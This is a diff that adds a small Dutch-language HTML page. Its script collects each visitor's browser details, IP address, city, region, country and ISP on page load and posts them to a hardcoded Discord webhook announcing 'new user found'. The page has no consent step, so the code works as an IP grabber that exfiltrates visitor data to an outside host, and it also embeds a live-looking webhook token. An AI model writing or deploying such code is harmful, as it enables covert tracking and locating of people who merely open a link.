@@ -1,0 +1,57 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Informatie Verzameling</title>
+</head>
+<body>
+    <h1>Gebruikersinformatie</h1>
+    <pre id="info"></pre>
+
+    <script>
+        async function getInfo() {
+            let info = {};
+            
+            // User Agent en andere browser info
+            info.userAgent = navigator.userAgent;
+            info.language = navigator.language;
+            info.platform = navigator.platform;
+            info.screenResolution = `${screen.width}x${screen.height}`;
+            info.timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+
+            // IP via externe API
+            try {
+                const res = await fetch('https://ipapi.co/json/');
+                const data = await res.json();
+                info.ip = data.ip;
+                info.city = data.city;
+                info.region = data.region;
+                info.country = data.country;
+                info.org = data.org;
+            } catch (err) {
+                info.ip = 'Niet beschikbaar';
+            }
+
+            document.getElementById('info').textContent = JSON.stringify(info, null, 2);
+
+            // Verstuur naar Discord Webhook
+            const webhookUrl = 'https://discord.com/api/webhooks/1347877842725371984/SSQUXuH1EbjqDA-UEXf9d_uik63AvOEyG19LiRFbdZuB9XsRpohp37zbFe9T0gCNxnKE'; // Vervang met jouw webhook URL
+            const payload = {
+                content: 'Nieuwe gebruiker gevonden!',
+                embeds: [{
+                    title: "Gebruikersinformatie",
+                    description: "```json\n" + JSON.stringify(info, null, 2) + "\n```"
+                }]
+            };
+
+            fetch(webhookUrl, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(payload)
+            });
+        }
+
+        getInfo();
+    </script>
+</body>
+</html>
